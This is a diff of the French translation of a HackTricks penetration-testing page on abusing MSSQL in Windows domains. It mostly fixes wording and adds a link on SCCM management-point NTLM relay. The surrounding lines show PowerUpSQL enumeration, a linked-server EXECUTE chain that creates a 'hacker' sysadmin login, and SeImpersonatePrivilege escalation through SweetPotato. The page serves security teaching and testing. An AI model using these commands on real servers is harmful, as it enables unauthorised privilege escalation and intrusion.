@@ -135,7 +135,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ## MSSQL Abus de base
 
-### Accéder à la DB
+### Accéder à la base de données
 ```bash
 # List databases
 Get-SQLInstanceDomain | Get-SQLDatabase
@@ -268,7 +268,7 @@ Si vous ne pouvez pas effectuer d'actions comme `exec xp_cmdshell` depuis `openq
 
 ### Manuel - EXECUTE
 
-Vous pouvez également abuser des liens de confiance en utilisant `EXECUTE` :
+Vous pouvez également abuser des liens de confiance en utilisant `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -278,9 +278,16 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 L'**utilisateur local MSSQL** a généralement un type de privilège spécial appelé **`SeImpersonatePrivilege`**. Cela permet au compte de "se faire passer pour un client après authentification".
 
-Une stratégie que de nombreux auteurs ont développée est de forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
+Une stratégie que de nombreux auteurs ont développée consiste à forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) a une collection de ces diverses techniques qui peuvent être exécutées via la commande `execute-assembly` de Beacon.
 
+
+
+### Relais NTLM du point de gestion SCCM (Extraction de secrets OSD)
+Voir comment les rôles SQL par défaut des **Points de gestion SCCM** peuvent être abusés pour extraire le compte d'accès réseau et les secrets de séquence de tâches directement à partir de la base de données du site :
+{{#ref}}
+sccm-management-point-relay-sql-policy-secrets.md
+{{#endref}}
 
 {{#include ../../banners/hacktricks-training.md}}
